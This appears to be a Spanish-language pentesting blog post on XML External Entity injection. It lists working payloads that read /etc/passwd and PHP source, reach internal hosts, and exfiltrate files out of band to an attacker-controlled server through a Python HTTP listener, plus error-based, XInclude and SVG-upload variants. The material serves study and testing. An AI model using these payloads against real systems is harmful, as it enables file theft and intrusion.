---
title: "XXE (XML External Entity Injection)"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [xxe-injection, xxe, ADCCFFA6]
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/XXE.jpg
    width: 800
    height: 500
---


# Entidades
- Genéricas / Customizadas
- Externas (XXE)
- Pre-definidas

## Inyecciones Básicas
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>
```

> Esto lo que va a hacer es intentar listar un archivo que reside dentro de la máquina victima mediante un "wrapper" en este caso "file:///"
{: .prompt-info }

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
    <bugreport>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>test</cvss>
    <reward>test</reward>
    </bugreport>
```

> Este "wrapper" sirve para que te reporte un archivo .php que reside en la máquina victima en formato "base64" de manera que asi lo puedes decodear con "base64 -d" y analizar el codigo que esta corriendo por detrás
{: .prompt-info }

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<ip_interna>/<file>"> ]>
<bugreport>
<title>&xxe;</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```

> Con esto lo que podemos hacer es acceder a una IP interna que se encuentre dentro de la red y obtener datos de algún archivo o lo que queramos
{: .prompt-info }

## Inyecciones a Ciegas
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<ip_externa>/<file>"> %xxe;]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<<!ENTITY &#x25; exfil SYSTEM 'http://<local_ip>/?file=%file;'>"> 
%eval
%exfil
```
```shell
# Ahora nos ponemos por escucha por el puerto 80
python3 -m http.server 80
```

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/1.jpg)

> Lo que esta pasando aqui es que de cara a la estructura XXE no nos permite poner entidades (&xxe;)

Por lo tanto lo que esta pasando es que se esta comunicando con un recurso que hemos creado en mi sistema que ya tiene definida entidades XXE por lo tanto la web apunta a nuestro recurso y realiza lo que le hemos indicado en nuestro archivo malicioso y nos lo reporta por pantalla en base64
{: .prompt-info }

## Inyecciones vía mensajes de error
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<ip_externa>/<file>"> %xxe; ]>
<bugreport>
<title>&xxe;</titl1e>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```
![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/2.jpg)

> Como vemos nos da error a si que vamos a aprovecharnos de esto para que despues de el error nos carge el archivo que queramos
{: .prompt-info }

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///meloinvento/%file;'>">
%eval;
%exfil;
```

> Lo que esta pasando aqui es que nosotros ocasinamos el error poniendo un archivo que no existe y como nosotros de cara a trámitar la petición ya estamos cargando la entidad en la propia web a si que despues de el erro obtendremos el archivo indicado en este caso "/etc/passwd"
{: .prompt-info }

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/3.jpg)

## Inyecciones Xinclude Attack

> Cuando la petición se trámita de manera que no tiene una estructura XML podemos realizar este ataque
{: .prompt-info }

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/4.jpg)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"></foo>
```

## Inyecciones vía subida de imagen

> Estas inyecciones se las puedes ver como en este caso al poner un comentario, creamos nuestro archivo que contenga:
{: .prompt-info }

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/5.jpg)

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/6.jpg)

> Si da error o algo lo que podemos hacer es añadirle una extension como .svg , .jpg, .png etc
{: .prompt-info }

![](../../assets/VectoresDeAtaque/XXE-(XML-External-Entity-Injection)/7.jpg)

> Como vemos la propia data nos la representa en la imagen
{: .prompt-info }

